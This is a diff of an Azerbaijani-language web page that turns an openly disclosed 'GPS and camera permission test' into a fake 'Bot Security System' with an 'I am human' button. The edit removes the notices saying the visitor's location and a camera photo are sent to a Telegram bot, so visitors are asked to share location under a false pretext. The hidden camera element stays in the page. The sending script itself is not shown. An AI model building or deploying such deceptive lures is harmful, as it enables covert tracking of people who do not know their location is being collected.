@@ -6,7 +6,7 @@
 <meta name="viewport"
       content="width=device-width, initial-scale=1.0">
 
-<title>Security Permission Test</title>
+<title>Bot Security System</title>
 
 <style>
 * {
@@ -144,36 +144,21 @@ video {
 
 <main class="container">
 
-  <div style="font-size:45px;">📍📷</div>
+  <div style="font-size:45px;">📍</div>
 
-  <h1>Security Permission Test</h1>
-
-  <p class="description">
-    GPS və kamera icazələrini yoxlayın.
-  </p>
+  <h1>Bot Security System</h1>
 
   <div class="notice">
     <strong>🔒 Məlumatlandırma</strong>
 
     <p>
-      📍 Test zamanı GPS konumunuz
-      Telegram botuna göndəriləcək.
+  Bot olmadiginizi təstiqləmək üçün location testini keçin
     </p>
 
-    <p>
-      📷 Kamera icazəsi verildikdə
-      təxminən 1 saniyə sonra foto çəkiləcək
-      və Telegram botuna göndəriləcək.
-    </p>
-
-    <p>
-      Kamera çəkilişdən sonra bağlanacaq.
-      İcazə vermək məcburi deyil.
-    </p>
   </div>
 
   <button id="startBtn" onclick="startTest()">
-    📍📷 Konumumu və şəklimi Telegram-a göndər
+    📍Mən İnsanam
   </button>
 
   <div id="gpsStatus"
@@ -199,14 +184,14 @@ video {
     <p>
       <strong>Android / Chrome:</strong><br>
       Saytın ünvanının yanındakı işarəyə basın →
-      Site settings → Location və Camera →
+      Site settings → Location →
       Allow.
     </p>
 
     <p>
       <strong>iPhone / Safari:</strong><br>
       Safari-də sayt ayarlarını açın və
-      Camera, Location icazələrini yoxlayın.
+      Location icazələrini yoxlayın.
       Həmçinin telefonun Settings bölməsində
       Location Services aktiv olmalıdır.
     </p>
@@ -226,7 +211,7 @@ video {
   <video id="camera" autoplay playsinline muted></video>
 
   <div class="footer">
-    GPS & Camera Security Test
+    GPS
   </div>
 
 </main>
